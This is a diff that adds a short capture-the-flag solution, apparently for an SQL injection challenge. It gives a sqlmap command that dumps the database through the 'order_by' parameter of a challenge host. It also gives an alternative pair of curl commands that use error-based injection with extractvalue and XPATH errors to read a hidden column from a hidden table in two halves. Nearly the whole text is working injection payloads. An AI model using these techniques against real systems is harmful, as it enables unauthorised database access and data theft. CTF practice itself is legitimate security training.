@@ -1,0 +1,8 @@
+tools = sqlmap
+command = sqlmap -u "http://ctf-chall.stembascc.com:5003/index.php?order_by=id" -p order_by --dump
+
+atau
+
+part1=$(curl -s "http://ctf-chall.stembascc.com:5003/index.php?order_by=extractvalue(1,concat(0x7e,(SELECT%20th1s_1s_s3cr3t_c0lumn%20FROM%20v3ry_s3cr3t_t4bl3%20LIMIT%201,1),0x7e))" | grep -oP "XPATH syntax error: '\K[^']+" | tr -d '~')
+part2=$(curl -s "http://ctf-chall.stembascc.com:5003/index.php?order_by=extractvalue(1,concat(0x7e,(SELECT%20SUBSTRING(th1s_1s_s3cr3t_c0lumn,32)%20FROM%20v3ry_s3cr3t_t4bl3%20LIMIT%201,1),0x7e))" | grep -oP "XPATH syntax error: '\K[^']+" | tr -d '~')
+echo "${part1}${part2}"
